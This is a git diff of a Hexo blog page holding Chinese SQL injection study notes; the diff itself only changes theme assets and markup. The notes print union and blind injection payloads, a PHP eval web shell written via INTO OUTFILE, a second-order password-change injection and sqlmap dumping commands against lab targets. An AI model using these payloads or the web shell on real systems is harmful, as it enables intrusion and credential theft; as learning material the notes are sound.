@@ -23,12 +23,12 @@
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title" content="sql注入学习">
     <meta name="twitter:description" content="Hexo Theme Redefine">
-    <meta name="twitter:image" content="/images/logo1.png">
+    <meta name="twitter:image" content="/images/redefine-logo.svg">
     <!--- Icon Part-->
-    <link rel="icon" type="image/png" href="/images/logo1.png" sizes="192x192">
-    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo1.png">
+    <link rel="icon" type="image/png" href="/images/redefine-logo.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-logo.svg">
     <meta name="theme-color" content="#005080">
-    <link rel="shortcut icon" href="/images/logo1.png">
+    <link rel="shortcut icon" href="/images/redefine-logo.svg">
     
     <title>
         
@@ -48,7 +48,7 @@
     <script id="hexo-configurations">
     let REDEFINE = window.REDEFINE || {};
     REDEFINE.hexo_config = {"hostname":"y4ny4n.cn","root":"/","language":"zh-CN"};
-    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/y4ny4n.jpg","favicon":"/images/logo1.png","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_image":{"light":"https://s1.ax1x.com/2023/03/12/ppM1Rmj.jpg","dark":"https://s1.ax1x.com/2023/03/12/ppM171U.jpg"},"title_color":{"light":"#fff","dark":"#fff"},"description":"Let me think that there is one among those stars that guides my life through the dark unknown.","custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.0","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":true,"audio":[{"name":"The Queen Of Argyll","artist":"Silly Wizard","url":"http://music.163.com/song/media/outer/url?id=19073366.mp3","cover":"/images/cover.jpg"},{"name":null,"artist":null,"url":null,"cover":null}]}}};
+    REDEFINE.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/me.jpg","favicon":"/images/redefine-logo.svg","og_image":{"enable":false,"image_url":null},"article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#f78736","right":"#367df7","transparency":35},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_image":{"light":"/images/back1.jpg","dark":"/images/back2.jpg"},"title_color":{"light":"#fff","dark":"#fff"},"description":"Let me think that there is one among those stars that guides my life through the dark unknown.","custom_font":{"enable":false,"font_family":null,"font_url":null}},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":false,"preload":true},"code_block":{"copy":true,"style":"mac","custom_font":{"enable":false,"font_family":null,"font_url":null}},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"1.2.0","friend_links":{"columns":2},"home_article":{"date_format":"auto","category":{"enable":true,"limit":3},"tag":{"enable":true,"limit":3}},"plugins":{"aplayer":{"enable":false,"audio":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]}}};
     REDEFINE.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
   </script>
     
@@ -116,6 +116,8 @@
                                 <a class="" 
                                     href="/"  >
                                     
+                                        
+                                            <i class="fa-regular fa-house"></i>
                                         
                                         首页
                                     
@@ -202,6 +204,8 @@
                         <a class="" 
                         href="/"  >
                              
+                                
+                                    <i class="fa-regular fa-house"></i>
                                 
                                 首页
                             
@@ -294,7 +298,7 @@
             
                 <div class="article-header">
                     <div class="avatar">
-                        <img src="/images/y4ny4n.jpg">
+                        <img src="/images/me.jpg">
                     </div>
                     <div class="info">
                         <div class="author">
@@ -368,7 +372,7 @@
 
             <div class="article-content markdown-body">
                 <p>sql注入学习笔记，感谢好朋友月夜见提供的学习资料。包含union注入、布尔盲注、时间盲注、报错注入、堆叠注入、二次注入、宽字节注入、UserAgent/Referer/Cookie注入、sqlmap的使用…</p>
-<a id="more"></a>
+<span id="more"></span>
 <h2 id="14-SQL注入原理"><a href="#14-SQL注入原理" class="headerlink" title="14 SQL注入原理"></a>14 SQL注入原理</h2><h3 id="OWASP-top10"><a href="#OWASP-top10" class="headerlink" title="OWASP top10"></a>OWASP top10</h3><h3 id="什么是SQL注入"><a href="#什么是SQL注入" class="headerlink" title="什么是SQL注入"></a>什么是SQL注入</h3><ul>
 <li><p>sql：结构化查询语言</p>
 </li>
@@ -386,7 +390,7 @@
 <li>4.许多的行和列组成一张表单</li>
 <li>5.若干的表单组成database</li>
 </ul>
-<p><img src="/2020/11/30/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20200324111143839.png" alt="image-20200324111143839"></p>
+<p><img lazyload src="/images/loading.svg" data-src="sql注入学习笔记.assets/image-20200324111143839.png" alt="image-20200324111143839"></p>
 <h5 id="数据库基础-1"><a href="#数据库基础-1" class="headerlink" title="数据库基础"></a>数据库基础</h5><h6 id="常用数据库查询语句"><a href="#常用数据库查询语句" class="headerlink" title="常用数据库查询语句"></a>常用数据库查询语句</h6><ul>
 <li>create datebase   创建数据库<strong>数据库名字不能使用全数字</strong></li>
 <li>drop database </li>
@@ -394,7 +398,7 @@
 <li>select databses() 当前的数据库名</li>
 </ul>
 <p>使用一个数据库 use 数据库名；</p>
-<p><a href="https://www.runoob.com/mysql" target="_blank" rel="noopener">https://www.runoob.com/mysql</a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.runoob.com/mysql">https://www.runoob.com/mysql <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <h6 id="常用数据库内置变量"><a href="#常用数据库内置变量" class="headerlink" title="常用数据库内置变量"></a>常用数据库内置变量</h6><ul>
 <li><p>version() 查询数据库版本</p>
 <p>@@version 效果等同</p>
@@ -409,42 +413,42 @@
 <ul>
 <li>concat 链接多个字符串 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(name,&#39;|&#39;,email,&#39;|&#39;,passwprd) from users;</span><br><span class="line">#若字符串查询内容中有一个为空，则整体为空</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat(name,&#x27;|&#x27;,email,&#x27;|&#x27;,passwprd) from users;</span><br><span class="line">#若字符串查询内容中有一个为空，则整体为空</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li>concat_ws</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#39;|&#39;,name.email,password) from users;</span><br><span class="line">#不会整体为空，第一个参数为分隔符，如果第一个参数为空，则整体为空</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select concat_ws(&#x27;|&#x27;,name.email,password) from users;</span><br><span class="line">#不会整体为空，第一个参数为分隔符，如果第一个参数为空，则整体为空</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li><p>group_concat</p>
 <p>把字段里的内容一起显示，限制：查询出来的结果的长度默认是1024</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from users;</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username) from users;</span><br></pre></td></tr></table></figure></div>
 <p>​            可以进行联合使用</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat_ws(&#39;|&#39;,username,id)) from users;</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(concat_ws(&#x27;|&#x27;,username,id)) from users;</span><br></pre></td></tr></table></figure></div>
 <p>2.字符串截取函数</p>
 <p>所有函数操作数从1开始而不是从0开始，除limit外</p>
 <ul>
 <li>substring</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substring((select username from users limit 0,1)，1，2)</span><br><span class="line">#substring第一个参数 查询的结果字符串，第二个参数 从什么地方开始截取，第三个参数 长度是多少</span><br><span class="line">#limit 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select substring((select username from users limit 0,1)，1，2)</span><br><span class="line">#substring第一个参数 查询的结果字符串，第二个参数 从什么地方开始截取，第三个参数 长度是多少</span><br><span class="line">#limit 如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目</span><br></pre></td></tr></table></figure></div>
 <p>substr也可以代替使用</p>
 <ul>
 <li>mid</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#39;test123&#39;,2,3)</span><br><span class="line">&gt;est</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select mid(&#x27;test123&#x27;,2,3)</span><br><span class="line">&gt;est</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li><p>left</p>
 <p>从左开始截取长度为3，right函数相反</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select left(&#39;test123&#39;,3)</span><br><span class="line">&gt;tes</span><br><span class="line">select right(&#39;test123&#39;,3)</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">select left(&#x27;test123&#x27;,3)</span><br><span class="line">&gt;tes</span><br><span class="line">select right(&#x27;test123&#x27;,3)</span><br><span class="line">&gt;123</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li><p>locate</p>
 <p>返回第一个参数字符串在第二个参数中第一次出现的位置</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select locate(‘123test123&#39;,&#39;as123test123&#39;)</span><br><span class="line">&gt;3</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select locate(‘123test123&#x27;,&#x27;as123test123&#x27;)</span><br><span class="line">&gt;3</span><br></pre></td></tr></table></figure></div>
 <p>3.返回指定的ASCII字符对应的数值</p>
 <ul>
 <li><p>ascii </p>
@@ -452,30 +456,30 @@
 <p>ord与ascii用法相同</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#39;a&#39;);</span><br><span class="line">&gt;97</span><br><span class="line">select ascii(substring((select username from users limit 0,1),2,1));</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(&#x27;a&#x27;);</span><br><span class="line">&gt;97</span><br><span class="line">select ascii(substring((select username from users limit 0,1),2,1));</span><br></pre></td></tr></table></figure></div>
 <p>4.返回指定数字对应的ascii字符</p>
 <ul>
 <li>char</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select char(97);</span><br><span class="line">&gt;a</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select char(97);</span><br><span class="line">&gt;a</span><br></pre></td></tr></table></figure></div>
 <p>5.字符串替换</p>
 <ul>
 <li><p>replace</p>
 <p>把username字段里的zangsan sds替换为了hh</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace((select  username from users limit 0,1),&#39;zangsan sds&#39;,&#39;hh&#39;)</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select replace((select  username from users limit 0,1),&#x27;zangsan sds&#x27;,&#x27;hh&#x27;)</span><br></pre></td></tr></table></figure></div>
 <p>6.计算长度</p>
 <ul>
 <li>length</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#39;hahshdk&#39;);</span><br><span class="line">&gt;7</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select length(&#x27;hahshdk&#x27;);</span><br><span class="line">&gt;7</span><br></pre></td></tr></table></figure></div>
 <ul>
 <li><p>count</p>
 <p>记录某个表下有多少记录</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users;</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select count(*) from users;</span><br></pre></td></tr></table></figure></div>
 <p>7.时间盲注会用到的函数</p>
 <p>sleep、if</p>
 <ul>
@@ -483,17 +487,17 @@
 <p>使输出结果延迟了10s</p>
 </li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,sleep(10);</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users union select 1,2,sleep(10);</span><br></pre></td></tr></table></figure></div>
 <p>8.读写文件函数</p>
 <p>写文件</p>
 <p>into outfile </p>
 <p>把一句话木马写入</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php@eval($_POST[&#39;mm&#39;?])&gt;&quot; into outfile &quot;d:&#x2F;shell.php&quot;</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select &quot;&lt;?php@eval($_POST[&#x27;mm&#x27;?])&gt;&quot; into outfile &quot;d:/shell.php&quot;</span><br></pre></td></tr></table></figure></div>
 <p>一般路径是网站的根路径</p>
 <p>into dumpfile(读取二进制文件)</p>
 <p>读文件</p>
 <p>load_file()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#39;d:&#x2F;shell.php&#39;)</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&#x27;d:/shell.php&#x27;)</span><br></pre></td></tr></table></figure></div>
 <p>9.注释方法</p>
 <ul>
 <li>#</li>
@@ -505,7 +509,7 @@
 </ul>
 <h2 id="17-18information-schema相关"><a href="#17-18information-schema相关" class="headerlink" title="17 18information_schema相关"></a>17 18information_schema相关</h2><p>information_schema(mysql 5.0以上的版本才存在)</p>
 <p>在MySQL中，把information_schema看作是一个数据库，确切地说是信息数据库，其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p>
-<p><a href="https://www.cnblogs.com/shengdimaya/p/6920677.html" target="_blank" rel="noopener">https://www.cnblogs.com/shengdimaya/p/6920677.html</a></p>
+<p><a class="link" target="_blank" rel="noopener" href="https://www.cnblogs.com/shengdimaya/p/6920677.html">https://www.cnblogs.com/shengdimaya/p/6920677.html <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>SCHEMATA表：提供了当前mysql实例中所有数据库的信息。是show databases结果取于此表</p>
 <p>TABLES表：提供了关于数据库中所有的表的信息。详细描述了某个表属于哪个schema，表类型，表引擎，创建时间等信息。是show tables from schemaname(数据库名)的结果取之此表。</p>
 <p>COLUMNS表：所有数据库所包含的所有表的列名信息以及每个列的信息。是show columns from schemaname.tablename 的结果取之此表。</p>
@@ -525,7 +529,7 @@
 <p>查询出所有列名</p>
 <p>如果只能看一个就可通过limit进行查阅</p>
 <p>?id=0 union select 1,database(),column_name from information_schema.columns where table_schema=’test’ and table_name=’users’ limit 1,1</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> tableName <span class="keyword">limit</span> i,n</span><br><span class="line"><span class="comment"># tableName：表名</span></span><br><span class="line"><span class="comment"># i：为查询结果的索引值(默认从0开始)，当i=0时可省略i</span></span><br><span class="line"><span class="comment"># n：为查询结果返回的数量</span></span><br><span class="line"><span class="comment"># i与n之间使用英文逗号","隔开</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">limit</span> n 等同于 <span class="keyword">limit</span> <span class="number">0</span>,n</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> tableName limit i,n</span><br><span class="line"># tableName：表名</span><br><span class="line"># i：为查询结果的索引值(默认从<span class="number">0</span>开始)，当i<span class="operator">=</span><span class="number">0</span>时可省略i</span><br><span class="line"># n：为查询结果返回的数量</span><br><span class="line"># i与n之间使用英文逗号&quot;,&quot;隔开</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">limit n 等同于 limit <span class="number">0</span>,n</span><br></pre></td></tr></table></figure></div>
 <h6 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h6><p>?id=0 union select 1,database(),username from users limit 0,1 //或使用group_concat()</p>
 <h3 id="具体操作"><a href="#具体操作" class="headerlink" title="具体操作"></a>具体操作</h3><p>判断是否存在sql注入</p>
 <ul>
@@ -697,7 +701,7 @@
 <p>查看数据库发现admin’#密码未被改变 而admin密码改变</p>
 <p>原理：</p>
 <p>修改密码源码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=<span class="string">"UPDATE users SET PASSWORD='$pass' where username='admin'#' and password='$curr_pass'"</span>;</span><br></pre></td></tr></table></figure>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;UPDATE users SET PASSWORD=&#x27;<span class="subst">$pass</span>&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;<span class="subst">$curr_pass</span>&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure></div>
 <p>实际修改了admin的密码 并且’ and password=’$curr_pass’被注释了</p>
 <p>这样就可以实现随意指定用户名而不用知道他的密码 修改其密码</p>
 <h2 id="28-宽字节注入"><a href="#28-宽字节注入" class="headerlink" title="28 宽字节注入"></a>28 宽字节注入</h2><p>一.什么是宽字节注入</p>
@@ -756,7 +760,7 @@
 <h2 id="31-sqlmap简介与使用"><a href="#31-sqlmap简介与使用" class="headerlink" title="31 sqlmap简介与使用"></a>31 sqlmap简介与使用</h2><p>sqlmap是一个自动化的SQL注入工具，其主要功能是扫描，发现并利用给定的URL的SQL注入漏洞，采用四种SQL注入技术：union注入，堆叠注入，报错注入，时间盲注，布尔盲注</p>
 <p>sqlmap基于python2.7</p>
 <h3 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h3><p><strong>判断是否存在注入</strong></p>
-<p>①sqlmap -u <a href="http://193.112.113.137/sqlilbs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilbs/less-1?id=1</a></p>
+<p>①sqlmap -u <a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilbs/less-1?id=1">http://193.112.113.137/sqlilbs/less-1?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
 <p>弹出it looks like the back-end DBMS is “MySQL”.Do you want to skip test payloads specific for other DBMSes?进行交互</p>
 <p>(数据库可能是MySQL数据库，是否跳过检测其他数据库)</p>
 <p>for the remaining tests,do you want to include all tests for ‘MySQL’ extending provided level(1) and risk(1) values?</p>
@@ -766,15 +770,15 @@
 <p>创建文本文件vim sqlcheck.txt</p>
 <p>sqlmap -r sqlcheck.txt</p>
 <p>效果和①相同</p>
-<p>当payload只有Id一个参数时不用加双引号，当有两个参数时，sqlmap -u “<a href="http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1</a>“ 使用＆并添加双引号</p>
+<p>当payload只有Id一个参数时不用加双引号，当有两个参数时，sqlmap -u “<a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1">http://193.112.113.137/sqlilabs/less-1?id=1&amp;uid=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ 使用＆并添加双引号</p>
 <p><strong>查询当前用户下所有数据库</strong></p>
-<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> —dbs</p>
+<p>sqlmap -u <a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilabs/less-1?id=1">http://193.112.113.137/sqlilabs/less-1?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> —dbs</p>
 <p><strong>获取某个数据库中的表名</strong></p>
-<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获取哪一个数据库中的表名) security —tables(获取security数据库中所有表名)</p>
+<p>sqlmap -u <a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilabs/less-1?id=1">http://193.112.113.137/sqlilabs/less-1?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -D(指定获取哪一个数据库中的表名) security —tables(获取security数据库中所有表名)</p>
 <p><strong>获取某张表中的字段名</strong></p>
-<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users —columns</p>
+<p>sqlmap -u <a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilabs/less-1?id=1">http://193.112.113.137/sqlilabs/less-1?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -D(指定获数据库来定位)security -T users —columns</p>
 <p><strong>获取字段里的数据</strong></p>
-<p>sqlmap -u <a href="http://193.112.113.137/sqlilabs/less-1?id=1" target="_blank" rel="noopener">http://193.112.113.137/sqlilabs/less-1?id=1</a> -D(指定获数据库来定位)security -T users -C id,username,password</p>
+<p>sqlmap -u <a class="link" target="_blank" rel="noopener" href="http://193.112.113.137/sqlilabs/less-1?id=1">http://193.112.113.137/sqlilabs/less-1?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> -D(指定获数据库来定位)security -T users -C id,username,password</p>
 <p>—dump</p>
 <p>需要获取的字段通过逗号连接 id,username,password</p>
 <h2 id="32-sqlmap自动化注入实战"><a href="#32-sqlmap自动化注入实战" class="headerlink" title="32 sqlmap自动化注入实战"></a>32 sqlmap自动化注入实战</h2><p>首先判断注入点是否存在</p>
@@ -793,7 +797,7 @@
 <p> 自动把所有数据库中所有表给读取出来</p>
 <p>并对相应的哈希值进行暴力破解</p>
 <h2 id="33-sqlmap的使用以及load-file-读取目标系统文件"><a href="#33-sqlmap的使用以及load-file-读取目标系统文件" class="headerlink" title="33 sqlmap的使用以及load_file()读取目标系统文件"></a>33 sqlmap的使用以及load_file()读取目标系统文件</h2><h3 id="sqlmap连接需要登录的页面"><a href="#sqlmap连接需要登录的页面" class="headerlink" title="sqlmap连接需要登录的页面"></a>sqlmap连接需要登录的页面</h3><p>ipconfig查询本地ip</p>
-<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —dbs</p>
+<p>sqlmap -u “<a class="link" target="_blank" rel="noopener" href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ —dbs</p>
 <p>会显示sqlmap got a 302 redirect to ‘…’ 进行重定向</p>
 <p>如果换一个浏览器，访问上述地址会首先判断是否登陆过系统</p>
 <p>如果没有登录，就会跳转到登录页面登录</p>
@@ -806,7 +810,7 @@
 <p>vim cookie.txt(新建一个txt) 保存请求报文</p>
 <p>sqlmap -r cookie.txt —dbs</p>
 <p>也可以达到同样的效果</p>
-<p>sqlmap -u “<a href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#" target="_blank" rel="noopener">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#</a>“ —cookie=””  —dbs</p>
+<p>sqlmap -u “<a class="link" target="_blank" rel="noopener" href="http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit#">http://172.20.10.2/DVWA/vulnerabilities/sqli/?id=1&amp;Submit=Submit# <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“ —cookie=””  —dbs</p>
 <h3 id="其他参数"><a href="#其他参数" class="headerlink" title="其他参数"></a>其他参数</h3><p>1.查看正在连接的数据库</p>
 <p>sqlmap -r cookie.txt —current-db</p>
 <p>2.获取数据库用户的密码</p>
@@ -1158,16 +1162,6 @@
     });
 </script>
 
-
-
-
-    <div id="aplayer"></div>
-
-    
-<script src="/js/libs/APlayer.min.js"></script>
-
-    
-<script src="/js/plugins/aplayer.js"></script>
 
 
 
